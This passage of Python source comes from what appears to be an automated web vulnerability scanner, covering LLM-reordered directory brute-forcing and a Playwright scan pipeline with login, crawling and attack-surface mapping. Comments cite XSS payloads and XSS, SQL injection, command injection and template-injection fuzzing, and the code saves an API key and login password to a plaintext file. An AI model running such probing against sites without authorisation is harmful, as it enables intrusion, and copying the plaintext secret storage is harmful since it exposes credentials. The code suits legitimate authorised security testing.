                if len(crawl_paths) >= 40:
                    break
            prompt = (
                f"You are a web pentester planning directory brute-forcing.\n"
                f"Target: {target_url}\n"
                f"Detected technology: {', '.join(tech_summary) or 'unknown'}\n"
                f"Discovered URL paths (the app's real structure — prioritise "
                f"paths related to these, e.g. their parent dirs, admin/API "
                f"variants, versioned siblings):\n"
                f"{json.dumps(crawl_paths[:40])}\n\n"
                f"Here is a wordlist of paths to try:\n"
                f"{json.dumps(wordlist)}\n\n"
                f"Reorder this list so the most likely-to-exist paths for "
                f"this technology stack AND the discovered structure come FIRST. "
                f"Return ONLY a JSON array of strings (the reordered paths), "
                f"no preamble."
            )
            raw = await llm_adapter._call_endpoint(
                prompt,
                system=("You are a web pentester planning directory "
                        "brute-forcing. You output ONLY a JSON array of "
                        "strings — no prose, no markdown fences, no preamble."),
            )
            if raw:
                # Parse the JSON array from the LLM response.
                text = raw.strip()
                if text.startswith("```"):
                    lines = text.split("\n")
                    if lines[0].startswith("```"):
                        lines = lines[1:]
                    if lines and lines[-1].strip() == "```":
                        lines = lines[:-1]
                    text = "\n".join(lines)
                start = text.find("[")
                end = text.rfind("]")
                if start != -1 and end != -1:
                    reordered = json.loads(text[start:end+1])
                    if isinstance(reordered, list):
                        # The LLM must REORDER, not curate. LLMs routinely
                        # trim entries when re-listing long arrays (e.g.
                        # 71 → 68), which silently dropped probe paths. Force
                        # a pure permutation: keep only KNOWN entries (drop
                        # hallucinated additions + duplicates), then append
                        # any originals the LLM omitted — so the probe SET is
                        # unchanged; only the order differs.
                        original_set = set(wordlist)
                        seen_re: set = set()
                        new_order: List[str] = []
                        for p in reordered:
                            ps = str(p)
                            if ps in original_set and ps not in seen_re:
                                seen_re.add(ps)
                                new_order.append(ps)
                        dropped = [p for p in wordlist if p not in seen_re]
                        if dropped:
                            logger.log("directory_bruteforce_llm",
                                       f"LLM reorder omitted {len(dropped)} path(s); "
                                       "appended at the end (probe set unchanged)")
                        wordlist = new_order + dropped
                        logger.log("directory_bruteforce_llm",
                                   "LLM reordered wordlist based on detected technology")
        except Exception as e:
            logger.log("directory_bruteforce_llm_error",
                       f"LLM reorder failed: {e} — using default order")

    # Already-crawled URLs — skip them (we know they exist).
    crawled_paths = set()
    for cu in crawl_map:
        try:
            crawled_paths.add(urlparse(cu.url).path)
        except Exception:
            pass

    # --- Build the list of bases to fuzz -----------------------------------
    # Always fuzz the root (legacy behaviour). ALSO fuzz each discovered path
    # PREFIX (e.g. crawl found /v1, /v2, /api/v1 → also try /v1/<entry>,
    # /v2/<entry>, /api/<entry>, /api/v1/<entry>). Versioned/API section
    # prefixes are exactly where interesting paths hide. Host scope is
    # preserved because every base is under the target's own netloc.
    MAX_PREFIX_BASES = 12
    prefix_set: set = set()
    for cp in crawled_paths:
        if not cp or cp == "/":
            continue
        segments = [s for s in cp.split("/") if s]
        # Walk ancestors: "/api/v1/users" → "/api/v1/users", "/api/v1", "/api"
        for i in range(len(segments), 0, -1):
            prefix = "/" + "/".join(segments[:i])
            if prefix != "/":
                prefix_set.add(prefix)
    # Shallower prefixes first (root-like sections), then cap the count to
    # bound total requests (wordlist × bases).
    prefixes = sorted(prefix_set, key=lambda p: (p.count("/"), p))[:MAX_PREFIX_BASES]
    # "" is the root base; the rest are absolute path prefixes like "/v1".
    bases: List[str] = [""] + prefixes

    logger.log("directory_bruteforce_start",
               f"trying {len(wordlist)} paths across {len(bases)} base(s) on "
               f"{base_url} (prefix-aware: root + {len(prefixes)} discovered)")

    # Use the BrowserContext's request API (not page.goto) for directory
    # brute-forcing — no page navigation/rendering, hard timeout, inherits
    # session cookies. (page.goto could hang on slow pages and poison the
    # shared page for later phases.)
    context = page.context
    seen_urls: set = set()
    # Progress counters — with prefix-aware fuzzing the total probe count is
    # wordlist × bases (potentially 900+ requests taking 10+ minutes). Only
    # HITS are logged, so without periodic progress lines the phase looks
    # frozen. Log every 25 probes.
    _probed_count = 0
    _total_estimate = len(bases) * len(wordlist)
    _hits_count = 0

    for base in bases:
        if GLOBAL_STATE.stop_event.is_set():
            break
        # base="" → root (probe base_url + "/"); base="/v1" → base_url + "/v1/"
        base_prefix = (base + "/") if base else "/"
        logger.log("directory_bruteforce_progress",
                   f"base={base or '/'} starting ({len(wordlist)} paths)")
        for path in wordlist:
            if GLOBAL_STATE.stop_event.is_set():
                break

            rel_path = "/" + path if not path.startswith("/") else path
            joined_path = base + rel_path if base else rel_path
            # Skip already-crawled paths (we know they exist).
            if joined_path in crawled_paths:
                continue

            test_url = urljoin(base_url + base_prefix, path)
            # Dedup across bases (don't probe the same URL twice).
            if test_url in seen_urls:
                continue
            seen_urls.add(test_url)

            _probed_count += 1
            if _probed_count % 25 == 0:
                logger.log("directory_bruteforce_progress",
                           f"{_probed_count}/{_total_estimate} URLs probed "
                           f"(base={base or '/'}, {_hits_count} hit(s) so far)")

            async with rate_limiter.slot():
                try:
                    # Use context.request.fetch — no page navigation, can't hang.
                    # Follow redirects (max 3) so we get the final status.
                    resp = await asyncio.wait_for(
                        context.request.fetch(test_url, method="GET",
                                              max_redirects=3, timeout=8000),
                        timeout=10.0,
                    )
                    status = resp.status
                    # Flag 200 (found) and 301/302 (redirect — may still be
                    # interesting). 401/403 confirm the path exists but needs auth.
                    if status in (200, 301, 302, 401, 403):
                        title = ""
                        try:
                            body = await asyncio.wait_for(resp.text(), timeout=3.0)
                            # Extract <title> from the body
                            import re as _re
                            title_match = _re.search(r"<title[^>]*>([^<]*)</title>",
                                                      body, _re.IGNORECASE)
                            if title_match:
                                title = title_match.group(1).strip()
                        except Exception:
                            pass
                        findings.append({
                            "base": base or "/",
                            "path": joined_path,
                            "url": test_url,
                            "status": status,
                            "title": title[:200],
                            "note": (
                                "Path exists (200)" if status == 200
                                else f"Redirect ({status})" if status in (301, 302)
                                else f"Auth required ({status})" if status in (401, 403)
                                else f"Status {status}"
                            ),
                        })
                        logger.log("directory_bruteforce_found",
                                   f"path={joined_path} base={base or '/'} "
                                   f"status={status} title={title[:40]}")
                        _hits_count += 1
                except asyncio.TimeoutError:
                    continue  # skip slow paths
                except Exception:
                    continue

    logger.log("directory_bruteforce_progress",
               f"done: {_probed_count} URL(s) probed across {len(bases)} base(s), "
               f"{_hits_count} hit(s)")
    return findings


async def run_scan(args: argparse.Namespace) -> int:
    """Main async entry point. Returns an exit code."""
    # --- Setup output dirs ---
    output_dir = Path(args.output).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)
    evidence_dir = output_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    # The trail file uses .jsonl extension to signal JSON Lines format.
    trail_path = output_dir / "execution_trail.jsonl"
    logger = ExecutionTrailLogger(trail_path)
    install_signal_handlers(logger)
    GLOBAL_STATE.scan_started_at = datetime.now(timezone.utc)
    # Make the logger reachable by the _pw() helper so it can log
    # Playwright action timeouts to the execution trail.
    GLOBAL_STATE.logger = logger
    scan_started_at = GLOBAL_STATE.scan_started_at

    # --- Per-scan weak-cipher policy override (--weak-ciphers) ---
    # WEAK_POLICY is loaded at import time from bin/weak_ciphers.txt; if the
    # user passed --weak-ciphers, reload it from their file so this scan uses
    # the per-scan policy. (The scanner runs as a subprocess per scan, so a
    # one-shot reload here is clean.)
    if getattr(args, "weak_ciphers", None):
        wc_override = Path(args.weak_ciphers)
        if wc_override.exists():
            global WEAK_POLICY, WEAK_CIPHER_SUBSTRINGS, WEAK_TLS_VERSIONS
            WEAK_POLICY = _load_weak_cipher_policy(logger, policy_path=wc_override)
            WEAK_CIPHER_SUBSTRINGS = [e.pattern for e in WEAK_POLICY if e.kind == "cipher"]
            WEAK_TLS_VERSIONS = [e.pattern for e in WEAK_POLICY if e.kind == "tls"]
            logger.log("weak_cipher_policy",
                       f"loaded per-scan policy from {wc_override.name} "
                       f"({len(WEAK_POLICY)} rules)")
        else:
            logger.log("weak_cipher_policy",
                       f"--weak-ciphers file not found: {wc_override}; using default policy")

    # --- Resume support ---
    # If --resume is set, load scan_state.json from the output dir and
    # restore the state from the last completed phase. Each phase checks
    # if it's in completed_phases; if so, it loads the data and skips.
    completed_phases: List[str] = []
    saved_header_records: List[HeaderRecord] = []
    saved_ssl_record: Optional[SSLRecord] = None
    saved_crawl_map: List[CrawledURL] = []
    saved_attack_surface: List[InputField] = []
    saved_passive: Optional[PassiveFindings] = None
    saved_findings: List[Finding] = []
    saved_llm_plan: Optional[Dict[str, Any]] = None
    saved_llm_analysis: Optional[Dict[str, Any]] = None
    saved_login_succeeded: bool = False

    if args.resume:
        state = load_scan_state(output_dir)
        if state:
            completed_phases = state.get("completed_phases", [])
            logger.log("scan_resume",
                       f"loaded scan_state.json; completed_phases={completed_phases}")
            # Restore data from saved state.
            # _dataclass_from_dict() filters unknown keys so resume is robust
            # to version skew (newer state file loaded by older scanner or
            # vice versa). Returns None on failure → the phase re-runs.
            if "header_records" in state:
                saved_header_records = [
                    hr for hr in (
                        _dataclass_from_dict(HeaderRecord, h)
                        for h in state["header_records"]
                    ) if hr is not None
                ]
            if "ssl_record" in state:
                saved_ssl_record = _dataclass_from_dict(
                    SSLRecord, state["ssl_record"])
            if "crawl_map" in state:
                saved_crawl_map = [
                    c for c in (
                        _dataclass_from_dict(CrawledURL, c)
                        for c in state["crawl_map"]
                    ) if c is not None
                ]
            if "attack_surface" in state:
                saved_attack_surface = [
                    i for i in (
                        _dataclass_from_dict(InputField, i)
                        for i in state["attack_surface"]
                    ) if i is not None
                ]
            if "passive" in state:
                saved_passive = _dataclass_from_dict(
                    PassiveFindings, state["passive"])
            if "findings" in state:
                for f in state["findings"]:
                    rebuilt = _dataclass_from_dict(Finding, f)
                    if rebuilt is not None:
                        saved_findings.append(rebuilt)
            if "llm_plan" in state:
                saved_llm_plan = state["llm_plan"]
            if "llm_analysis" in state:
                saved_llm_analysis = state["llm_analysis"]
            if "login_succeeded" in state:
                saved_login_succeeded = state["login_succeeded"]
            # Update GLOBAL_STATE so the emergency-stop handler has access.
            GLOBAL_STATE.partial_findings = saved_findings
            GLOBAL_STATE.partial_crawl_map = saved_crawl_map
            GLOBAL_STATE.partial_attack_surface = saved_attack_surface
            GLOBAL_STATE.partial_headers = saved_header_records
            GLOBAL_STATE.partial_ssl = saved_ssl_record
        else:
            logger.log("scan_resume",
                       "no scan_state.json found; starting fresh scan")

    # --- Load existing findings when using --skip-tests (Kill Chrome & Restart) ---
    # When the user clicks "Kill Chrome & Restart", the kill-chrome-restart
    # endpoint copies the old scan's findings.json to the new scan's output
    # dir. We need to load these into GLOBAL_STATE.partial_findings so the
    # scanner accumulates on top of them instead of starting from zero.
    if args.skip_tests > 0 and not args.resume:
        try:
            existing_findings_path = output_dir / "findings.json"
            if existing_findings_path.exists():
                existing_data = json.loads(
                    existing_findings_path.read_text(encoding="utf-8")
                )
                if isinstance(existing_data, list) and existing_data:
                    loaded_count = 0
                    for fd in existing_data:
                        try:
                            f = Finding(
                                finding_id=fd.get("finding_id", ""),
                                owasp_category=fd.get("owasp_category", ""),
                                title=fd.get("title", ""),
                                severity=fd.get("severity", "Medium"),
                                url=fd.get("url", ""),
                                payload=fd.get("payload", ""),
                                request_raw=fd.get("request_raw", ""),
                                response_raw=fd.get("response_raw", ""),
                                execution_trail=fd.get("execution_trail", []),
                                screenshot_path=fd.get("screenshot_path"),
                                patterns_matched=fd.get("patterns_matched", []),
                                unverified=fd.get("unverified", True),
                            )
                            GLOBAL_STATE.partial_findings.append(f)
                            loaded_count += 1
                        except Exception:
                            pass
                    if loaded_count > 0:
                        logger.log("findings_restored",
                                   f"loaded {loaded_count} existing findings from "
                                   f"previous scan (Kill Chrome & Restart — "
                                   f"resuming at test {args.skip_tests + 1})")
        except Exception as e:
            logger.log("findings_restore_error",
                       f"failed to load existing findings: {e}")

    logger.log("scan_start",
               f"target={args.url} output={output_dir} depth={args.depth} "
               f"delay={args.delay}ms concurrency={args.concurrency}"
               f" resume={args.resume}")

    # Log watchdog status so it's visible in the trail + UI.
    _no_watchdog = getattr(args, "no_watchdog", False) or \
                   os.environ.get("WEBRECON_DISABLE_WATCHDOG", "") == "1"
    if _no_watchdog:
        logger.log("watchdog_disabled",
                   "ALL WATCHDOGS DISABLED via --no-watchdog or "
                   "WEBRECON_DISABLE_WATCHDOG=1. Per-test 60s pkill, "
                   "progress 120s pkill, and context recycle (every 50 "
                   "tests) are all OFF. A hung test will freeze the scan "
                   "forever — use Stop or Kill Chrome & Restart to "
                   "recover manually.")

    # --- Save PID + scan args for the external supervisor ---
    # The supervisor (bin/supervisor.py) is a SEPARATE process that
    # monitors heartbeat.json. If the heartbeat goes stale (scanner
    # hung), the supervisor kills the scanner PID and restarts it with
    # --resume --skip-tests <last_test>.
    #
    # We save:
    #   scanner.pid  — the OS PID of this scanner process
    #   scan_args.json — all parsed CLI args (so the supervisor can
    #                    reconstruct the exact command line + add
    #                    --resume --skip-tests N)
    try:
        (output_dir / "scanner.pid").write_text(
            str(os.getpid()), encoding="utf-8")
        scan_args_save = {
            k: v for k, v in vars(args).items()
            if not k.startswith("_")
        }
        # Also save the Python interpreter path so the supervisor uses
        # the same one (important for venvs).
        scan_args_save["_python"] = sys.executable
        scan_args_save["_scanner_path"] = str(Path(__file__).resolve())
        scan_args_save["_saved_at"] = datetime.now(timezone.utc).isoformat()
        # Save the LLM env vars so the supervisor can pass them to the
        # restarted scanner. Without this, the supervisor-restarted
        # scanner doesn't have LLM_BASE_URL/LLM_API_KEY/LLM_MODEL in its
        # environment → the LLM analyzer says "not configured" even though
        # the LLM plan worked (the plan ran in the ORIGINAL scanner
        # process which got the env vars from scanner-runner.ts).
        scan_args_save["_env"] = {
            "LLM_BASE_URL": os.environ.get("LLM_BASE_URL", ""),
            "LLM_API_KEY": os.environ.get("LLM_API_KEY", ""),
            "LLM_MODEL": os.environ.get("LLM_MODEL", ""),
            "WEBRECON_LOGIN_PASSWORD": os.environ.get("WEBRECON_LOGIN_PASSWORD", ""),
            "WEBRECON_DISABLE_WATCHDOG": os.environ.get("WEBRECON_DISABLE_WATCHDOG", ""),
            "WEBRECON_LLM_TIMEOUT_SECONDS": os.environ.get("WEBRECON_LLM_TIMEOUT_SECONDS", ""),
        }
        (output_dir / "scan_args.json").write_text(
            json.dumps(scan_args_save, indent=2, ensure_ascii=False,
                       default=str),
            encoding="utf-8",
        )
        logger.log("supervisor_ready",
                   f"PID={os.getpid()} — supervisor can monitor + restart "
                   f"this scan via: python3 bin/supervisor.py {output_dir}")

        # --- Write an INITIAL heartbeat immediately ---
        # Without this, the supervisor sees the OLD heartbeat from the
        # previous (killed) scanner run. If that heartbeat is stale
        # (>threshold), the supervisor immediately kills THIS scanner
        # before it even starts — causing an infinite restart loop.
        #
        # By writing a fresh heartbeat with the CURRENT PID + timestamp,
        # the supervisor knows this is a new scanner and gives it time
        # to reach active_scan (where heartbeats are written per-test).
        global _GLOBAL_HEARTBEAT_PATH
        _GLOBAL_HEARTBEAT_PATH = output_dir / "heartbeat.json"
        _write_heartbeat(0, 0, phase="scan_start")
        logger.log("heartbeat_init",
                   f"wrote initial heartbeat (PID={os.getpid()}) — "
                   f"supervisor will not kill this scan during pre-scan phases")
        # Start the background heartbeat keeper. This keeps heartbeat.json
        # fresh during ANY long phase (LLM analysis/planner/summary, source
        # code, etc.), not just active fuzzing — preventing the supervisor
        # from killing+restarting the scan in a loop during slow LLM work.
        # See _heartbeat_keeper for the full rationale + safety analysis.
        asyncio.create_task(_heartbeat_keeper())
    except Exception as e:
        logger.log("supervisor_init_error",
                   f"failed to save PID/args for supervisor: {e}")
    # Warn about missing reference files.
    if args.headers is None:
        logger.log("scan_start",
                   "WARNING: --headers not provided; using default "
                   "reference list. Supply a whitelist.txt for production "
                   "engagements.")
    if args.payloads is None:
        logger.log("scan_start",
                   "NOTE: --payloads not provided. Payloads are loaded from "
                   "bin/payloads.txt (editable, no code change). If that file "
                   "is missing or empty, active fuzzing is skipped.")

    # --- Load reference files ---
    reference_path = Path(args.headers) if args.headers else None
    payloads_path = Path(args.payloads) if args.payloads else None
    payloads = _load_payloads(payloads_path, logger)

    # If no payloads were loaded, warn the user. Active fuzzing will be
    # skipped (0 inputs × 0 payloads = 0 tests), but the rest of the scan
    # (crawling, headers, SSL, source code analysis, etc.) still runs.
    if not payloads:
        logger.log("scan_start",
                   "WARNING: No payloads loaded. Active fuzzing (XSS/SQLi/"
                   "PathTraversal/CMDi/SSTI) will be SKIPPED. All other scan "
                   "phases (crawling, headers, SSL, inventory, etc.) will "
                   "still run. To enable fuzzing, populate bin/payloads.txt "
                   "or use --payloads / the Settings tab.")

    # --- Rate limiter ---
    rate_limiter = RateLimiter(delay_ms=args.delay,
                               concurrency=args.concurrency)

    # --- Module instances ---
    header_capture = HeaderCapture(reference_path, logger)
    ssl_inspector = SSLInspector(logger)
    crawler = Crawler(
        target_url=args.url,
        depth=args.depth,
        scope_patterns=args.scope_patterns,
        exclude_patterns=args.exclude_patterns,
        allow_external=args.allow_external,
        ignore_robots=args.ignore_robots,
        rate_limiter=rate_limiter,
        logger=logger,
    )
    surface_mapper = AttackSurfaceMapper(logger)
    # Determine whether this scan is authenticated. The session-expiry
    # detector only kicks in for authenticated scans — otherwise any
    # public page containing a login form would falsely pause the scan.
    # A scan is "authenticated" if either:
    #   - --login-url was provided (automated form login), OR
    #   - --load-state was provided (manual browser login via the
    #     'Launch Browser to Login' button → storageState JSON).
    is_authenticated = bool(
        getattr(args, "login_url", None)
        or getattr(args, "load_state", None)
    )
    owasp_scanner = OWASPScanner(
        payloads=payloads,
        max_payload_bytes=args.max_payload_bytes,
        rate_limiter=rate_limiter,
        logger=logger,
        evidence_dir=evidence_dir,
        is_authenticated=is_authenticated,
        skip_tests=getattr(args, "skip_tests", 0),
        verbose_tests=getattr(args, "verbose_tests", False) or getattr(args, "debug", False),
        ignore_session_expiry=getattr(args, "ignore_session_expiry", False),
        debug_mode=getattr(args, "debug", False),
        no_watchdog=getattr(args, "no_watchdog", False) or
                    os.environ.get("WEBRECON_DISABLE_WATCHDOG", "") == "1",
    )
    evidence_engine = EvidenceEngine(evidence_dir, logger)
    llm_adapter = LLMAdapter(max_tokens=args.llm_tokens)

    # --- Launch Playwright ---
    # We use a single browser instance and a single context. The context
    # carries cookies across pages, which is essential for testing
    # authenticated endpoints (the engineer can pre-seed cookies if
    # needed via --cookies-file, future feature).
    browser: Optional[Browser] = None
    try:
        pw = await async_playwright().start()
        GLOBAL_STATE.playwright_ctx = pw
        browser = await pw.chromium.launch(
            headless=args.browser_headless,
            # Disable Chromium's background throttling so our screenshots
            # and timings aren't affected.
            args=["--disable-background-timer-throttling",
                  "--disable-renderer-backgrounding",
                  "--disable-background-networking"],
        )
        GLOBAL_STATE.browser = browser
        context = await browser.new_context(
            # We set a realistic User-Agent so the target's WAF doesn't
            # trivially fingerprint us as Playwright. This is NOT stealth
            # — Playwright leaves many other detectable signals.
            user_agent=("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
            viewport={"width": 1280, "height": 720},
            ignore_https_errors=True,  # we want to inspect even invalid certs
        )

        # --- Apply custom HTTP headers (if --custom-headers was provided) ---
        # These headers are sent with EVERY request the browser makes.
        # Use for: CSRF tokens, Authorization headers, custom auth cookies,
        # internal API keys, etc.
        if args.custom_headers:
            try:
                custom_headers = json.loads(args.custom_headers)
                if isinstance(custom_headers, dict):
                    await context.set_extra_http_headers(custom_headers)
                    logger.log(
                        "custom_headers",
                        f"applied {len(custom_headers)} custom headers: "
                        f"{list(custom_headers.keys())}",
                    )
                else:
                    logger.log("custom_headers_error",
                               "--custom-headers must be a JSON object")
            except json.JSONDecodeError as e:
                logger.log("custom_headers_error",
                           f"invalid JSON in --custom-headers: {e}")

        page = await context.new_page()

        # --- Auto-dismiss JavaScript dialogs (alert / confirm / prompt) ---
        # CRITICAL: When the scanner injects a payload like
        # `<marquee onstart=alert(1)>` or `<script>alert(1)</script>` and
        # the target is ACTUALLY vulnerable, the alert() EXECUTES in the
        # browser and opens a modal dialog. Playwright's page.goto() /
        # page.content() then BLOCK FOREVER waiting for the dialog to be
        # dismissed — which freezes the entire scan. The user sees the
        # last active_inject log line and nothing else; the Stop button
        # sends SIGTERM but the signal handler can't interrupt Playwright's
        # blocked C call.
        #
        # Fix: register a dialog handler that auto-dismisses every dialog
        # as soon as it opens. We log each dismissal so the engineer knows
        # the payload actually executed (strong signal of a real XSS).
        def _on_dialog(dialog: Any) -> None:
            try:
                dialog_type = dialog.type
                dialog_msg = dialog.message[:200]
                logger.log(
                    "js_dialog_dismissed",
                    f"type={dialog_type} message={dialog_msg!r} "
                    f"(payload likely executed — verify in evidence)",
                )
                # dismiss() works for alert/confirm/prompt/beforeunload.
                # For prompt, accept() would return the default value;
                # dismiss() is safer (doesn't pretend the user typed anything).
                asyncio.create_task(dialog.dismiss())
            except Exception as e:
                # Don't let dialog handler errors kill the scan.
                logger.log("js_dialog_error", f"failed to dismiss dialog: {e}")
        page.on("dialog", _on_dialog)

        # Capture uncaught JS exceptions for the trail. These often indicate
        # the payload broke the page's JS (which can be a signal for SQLi
        # error-based injection or SSTI). Not a finding by itself, but
        # useful context for the engineer reviewing the evidence.
        #
        # DEDUPLICATION: Some pages have broken JS (jQuery not loaded, etc.)
        # that fires the SAME error on every page load. We track seen errors
        # and only log the FIRST occurrence per error type — otherwise the
        # trail gets flooded with hundreds of identical entries.
        _seen_crawl_js_errors: set = set()
        def _on_pageerror(err: Any) -> None:
            try:
                msg = str(err)[:300]
                fingerprint = msg[:100]
                if fingerprint in _seen_crawl_js_errors:
                    return
                _seen_crawl_js_errors.add(fingerprint)
                logger.log("js_pageerror", msg)
            except Exception:
                pass
        page.on("pageerror", _on_pageerror)

        # --- Step 2.4: Load saved browser state (if --load-state provided) ---
        # This loads cookies + localStorage from a Playwright storageState
        # JSON file. Used when the user captured a session via the
        # "Launch Browser to Login" button (handles CAPTCHA, 2FA, SSO that
        # the automated LoginHelper can't deal with).
        login_succeeded = False
        if args.load_state:
            state_file = Path(args.load_state)
            if state_file.exists():
                try:
                    state_data = json.loads(state_file.read_text(encoding="utf-8"))
                    # Playwright's add_cookies expects a list of cookie dicts.
                    cookies = state_data.get("cookies", [])
                    if cookies:
                        await context.add_cookies(cookies)
                    # localStorage is per-origin — we need to navigate to
                    # each origin before setting items. We do this lazily
                    # (when the scanner first navigates to each origin).
                    # For now, we log what we loaded.
                    origins = state_data.get("origins", [])
                    # sessionStorage (captured by the manual-login service).
                    session_storage = state_data.get("sessionStorage", {})
                    login_succeeded = len(cookies) > 0
                    logger.log(
                        "load_state",
                        f"loaded {len(cookies)} cookies + "
                        f"{len(origins)} localStorage origins + "
                        f"{len(session_storage)} sessionStorage origins "
                        f"from {state_file.name}",
                    )
                    # Store the state data so we can inject localStorage/
                    # sessionStorage when we navigate to each origin.
                    # We use a page.on('framenavigated') handler.
                    loaded_origins = {o.get("origin"): o.get("localStorage", [])
                                       for o in origins}
                    loaded_session_storage = session_storage

                    async def _inject_storage(frame):
                        """Inject localStorage + sessionStorage for the current origin."""
                        try:
                            # Extract origin (scheme://host:port) from the frame URL.
                            frame_url = frame.url
                            if not frame_url:
                                return
                            parts = frame_url.split("/")
                            origin = "/".join(parts[:3]) if len(parts) >= 3 else frame_url
                            # localStorage
                            if origin in loaded_origins:
                                for item in loaded_origins[origin]:
                                    await frame.evaluate(
                                        f"localStorage.setItem({json.dumps(item.get('name',''))}, "
                                        f"{json.dumps(item.get('value',''))})"
                                    )
                            # sessionStorage
                            if origin in loaded_session_storage:
                                for key, value in loaded_session_storage[origin].items():
                                    await frame.evaluate(
                                        f"sessionStorage.setItem({json.dumps(key)}, "
                                        f"{json.dumps(value)})"
                                    )
                        except Exception:
                            pass  # not all frames support localStorage

                    page.on("framenavigated", lambda frame:
                            asyncio.create_task(_inject_storage(frame)))
                except Exception as e:
                    logger.log("load_state_error", f"failed to load state: {e}")
            else:
                logger.log("load_state_error", f"state file not found: {state_file}")

        # --- Step 2.5: Pre-Scan Login (if --login-url was provided) ---
        # We perform login BEFORE any other navigation so the BrowserContext
        # carries the session cookies into every subsequent request. If
        # login fails, we continue as an unauthenticated user — the
        # report will note the scan was unauthenticated.
        if args.login_url and not login_succeeded and not GLOBAL_STATE.stop_event.is_set():
            # NOTE: skipped when a captured session (--load-state) already
            # authenticated us (login_succeeded=True above). This matters for
            # OAuth/SSO (Microsoft/Google/SAML): the app's login page redirects
            # to an IdP, form login can't fill a username field, and running it
            # anyway would clobber login_succeeded back to False and report the
            # scan as UNAUTHENTICATED despite the captured session being loaded.
            logger.log("phase", f"starting pre-scan login at {args.login_url}")
            login_helper = LoginHelper(
                login_url=args.login_url,
                username=args.login_user,
                password=args.login_password,
                username_field=args.login_user_field,
                password_field=args.login_pass_field,
                submit_selector=args.login_submit_selector,
                logger=logger,
            )
            login_succeeded = await login_helper.login(page)
            if login_succeeded:
                logger.log("phase", "login completed; proceeding with "
                                    "authenticated scan")
            else:
                logger.log("phase", "WARNING: login failed; proceeding "
                                    "with UNAUTHENTICATED scan — coverage "
                                    "will be limited to the unauthenticated "
                                    "attack surface")
        elif args.login_url is None:
            # No login requested — this is the normal unauthenticated path.
            # We don't log this as a warning because the engineer explicitly
            # chose not to authenticate.
            pass

        # --- Step 3: Header Capture ---
        if "header_capture" in completed_phases:
            logger.log("phase", "RESUMED: skipping header capture")
            header_records = saved_header_records
        elif not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting header capture")
            header_records = await header_capture.capture(
                page, args.url, output_dir,
            )
            GLOBAL_STATE.partial_headers = header_records
            completed_phases.append("header_capture")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records)
        else:
            header_records = GLOBAL_STATE.partial_headers

        # --- Step 4: SSL/TLS Inspection ---
        if "ssl" in completed_phases:
            logger.log("phase", "RESUMED: skipping SSL/TLS inspection")
            ssl_record = saved_ssl_record or SSLRecord(
                hostname=urlparse(args.url).hostname or "",
                port=urlparse(args.url).port or 443,
            )
        elif not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting SSL/TLS inspection")
            ssl_record = ssl_inspector.inspect(args.url, output_dir)
            GLOBAL_STATE.partial_ssl = ssl_record
            # Save ssl_record.json as a standalone file for the web UI
            # (the SSL tab reads this file to display certificate details).
            try:
                ssl_json_path = output_dir / "ssl_record.json"
                ssl_json_path.write_text(
                    json.dumps(asdict(ssl_record), indent=2,
                               ensure_ascii=False, default=str),
                    encoding="utf-8",
                )
            except Exception:
                pass
            completed_phases.append("ssl")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records,
                            ssl_record=ssl_record)
        else:
            ssl_record = GLOBAL_STATE.partial_ssl or SSLRecord(
                hostname=urlparse(args.url).hostname or "",
                port=urlparse(args.url).port or 443,
            )

        # --- Step 5: Crawler ---
        if "crawl" in completed_phases:
            logger.log("phase", "RESUMED: skipping crawl")
            crawl_map = saved_crawl_map
        elif not GLOBAL_STATE.stop_event.is_set():
            # Health check — is the page still alive after header capture?
            try:
                await asyncio.wait_for(page.content(), timeout=5.0)
            except Exception:
                logger.log("phase", "page is dead before crawl — recreating")
                try:
                    page = await asyncio.wait_for(context.new_page(), timeout=5.0)
                    await _pw(page.goto, args.url, wait_until="domcontentloaded",
                              timeout=10000, default=None)
                    logger.log("phase", "page recreated for crawl")
                except Exception as e:
                    logger.log("phase", f"failed to recreate page for crawl: {e}")
                    crawl_map = []
                    completed_phases.append("crawl")
                    save_scan_state(output_dir, completed_phases,
                                    header_records=header_records,
                                    ssl_record=ssl_record,
                                    crawl_map=[])
                    # Skip to next phase
                    pass
            logger.log("phase", "starting BFS crawl")
            crawl_map = await crawler.crawl(page, output_dir)
            GLOBAL_STATE.partial_crawl_map = crawl_map
            completed_phases.append("crawl")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records,
                            ssl_record=ssl_record,
                            crawl_map=crawl_map)
        else:
            crawl_map = GLOBAL_STATE.partial_crawl_map

        # --- Step 6: Attack Surface Mapper ---
        # CRITICAL: Check if the page is still alive before mapping.
        # The header capture + crawl may have left the page in a bad state
        # (especially if networkidle timed out). If the page is dead,
        # create a new one from the context.
        page_sources: Dict[str, str] = {}  # url → raw HTML
        if "attack_surface" in completed_phases:
            logger.log("phase", "RESUMED: skipping attack surface mapping")
            attack_surface = saved_attack_surface
        elif not GLOBAL_STATE.stop_event.is_set():
            # Health check — is the page still alive?
            try:
                await asyncio.wait_for(page.content(), timeout=5.0)
            except Exception:
                logger.log("phase", "page is dead before attack surface mapping — recreating")
                try:
                    page = await asyncio.wait_for(context.new_page(), timeout=5.0)
                    # Navigate to the target URL so the mapper has a page to work with
                    await _pw(page.goto, args.url, wait_until="domcontentloaded",
                              timeout=10000, default=None)
                    logger.log("phase", "page recreated successfully")
                except Exception as e:
                    logger.log("phase", f"failed to recreate page: {e} — attack surface may be empty")

            logger.log("phase", "starting attack surface mapping")
            attack_surface = await surface_mapper.map_all(
                page, crawl_map, output_dir,
            )
            GLOBAL_STATE.partial_attack_surface = attack_surface

            # Capture raw HTML for each in-scope URL (for source code analysis).
            # We re-read page.content() for the current page (already loaded
            # by the mapper). For other pages, we do a lightweight goto +
            # content capture. This is technically extra requests, but only
            # for in-scope URLs that were already crawled — so the server
            # has already seen this traffic. We cap at 60 pages to bound
            # the time (raised from 30: page_sources feeds the Inventory AI
            # extraction + Interesting fallback, which the first-30 cap
            # starved on larger crawls).
            logger.log("phase", "capturing raw HTML for source code analysis")
            for cu in crawl_map[:60]:
                if not cu.in_scope:
                    continue
                if GLOBAL_STATE.stop_event.is_set():
                    break
                try:
                    async with rate_limiter.slot():
